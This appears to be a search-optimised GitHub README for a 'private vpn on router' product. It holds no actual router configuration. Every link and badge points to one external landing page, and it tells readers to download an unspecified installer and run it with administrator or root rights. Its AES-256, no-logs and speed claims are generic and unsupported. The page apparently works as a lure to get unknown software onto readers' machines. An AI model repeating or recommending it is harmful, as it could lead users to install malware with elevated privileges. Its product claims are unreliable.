# ⚡ private vpn on router

[![Download](https://img.shields.io/badge/Download-Get%20Build-blue?style=for-the-badge)](https://spainharley.github.io/private-vpn-on-router-landing/)
[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-2ea44f?style=for-the-badge)](https://spainharley.github.io/private-vpn-on-router-landing/)
[![License](https://img.shields.io/badge/License-MIT-black?style=for-the-badge)](https://spainharley.github.io/private-vpn-on-router-landing/)

## About

**private vpn on router** is a practical setup path for running a **private vpn** at the router level so every device on your network inherits protection—TVs, consoles, phones, guests, and anything that can’t run a VPN app.

This repo documents the workflow and points to the installer bundle and config pack. Source and release notes live here:  
https://github.com/spainharley/private-vpn-on-router-seo

## Features

- **AES-256 encryption** end-to-end tunnel configuration
- **No-Logs policy** posture: privacy-first defaults and minimal telemetry assumptions
- **Kill Switch** guidance for router + client fail-closed behavior
- **Global Servers** profiles for region switching without rewiring your network
- **High speed** routing tips (CPU, ciphers, MTU) to avoid slowdowns
- **Stable connection** keepalive + reconnect strategy for long-running links
- **Privacy and security focus**: DNS handling and leak-reduction checklist

## System Requirements

| Item | Requirement |
|---|---|
| Windows | Windows 10/11 (admin access) |
| macOS | macOS 12+ (admin access) |
| Linux | Ubuntu/Debian/Fedora (root or sudo) |
| RAM | 2 GB+ (4 GB recommended) |
| Storage | 200 MB free |
| Internet | Stable broadband; router with VPN client support (or compatible firmware) |

## Installation

> All downloads and the latest setup package are published here:  
> https://spainharley.github.io/private-vpn-on-router-landing/

### Windows
1. Download the package from the landing page.
2. Run the installer as Administrator.
3. Import the router profile/config from the bundle.
4. Apply DNS + Kill Switch options, then connect.

### macOS
1. Download the macOS build from the landing page.
2. Install and allow required network permissions when prompted.
3. Import the router profile/config.
4. Connect and verify IP/DNS from a browser test page.

### Linux
1. Download the Linux bundle from the landing page.
2. Extract and install the included client/tools.
3. Import the provided config profile.
4. Start the service and confirm the tunnel stays up after reboot.

## Comparison

| Option | Speed | AES-256 | No Logs | Kill Switch | Global Servers |
|---|---:|:---:|:---:|:---:|:---:|
| **private vpn on router** | High speed | ✅ | ✅ | ✅ | ✅ |
| Typical free VPN | Low–Medium | ❓ | ❌ | ❌ | ❌/Limited |
| Per-device VPN only | Medium–High | ✅ | ✅/Varies | ✅ | ✅ |

## FAQ

**Q: Does “private vpn on router” protect devices that can’t install apps (TV/console/IoT)?**  
A: Yes. Router-level VPN covers everything behind the router.

**Q: Will a router VPN slow my network down?**  
A: It depends on router CPU and settings. Use supported ciphers, avoid double NAT, and pick nearby Global Servers for best speed.

**Q: Can I keep local LAN access (printers/NAS) while using the VPN?**  
A: Yes. Configure split routing or local subnet exceptions in the router profile.

**Q: What happens if the VPN drops?**  
A: Use the Kill Switch guidance so traffic fails closed instead of leaking outside the tunnel.

## Download

Get the latest build, router profiles, and setup notes here:  
**https://spainharley.github.io/private-vpn-on-router-landing/**

## Final CTA

[![Download Now](https://img.shields.io/badge/Download-Private%20VPN%20On%20Router-blue?style=for-the-badge)](https://spainharley.github.io/private-vpn-on-router-landing/)
[![Open Landing Page](https://img.shields.io/badge/Open-Landing%20Page-2ea44f?style=for-the-badge)](https://spainharley.github.io/private-vpn-on-router-landing/)
[![Repository](https://img.shields.io/badge/Repo-private--vpn--on--router--seo-black?style=for-the-badge)](https://github.com/spainharley/private-vpn-on-router-seo)

*Private network by default. Route it once. Protect everything.*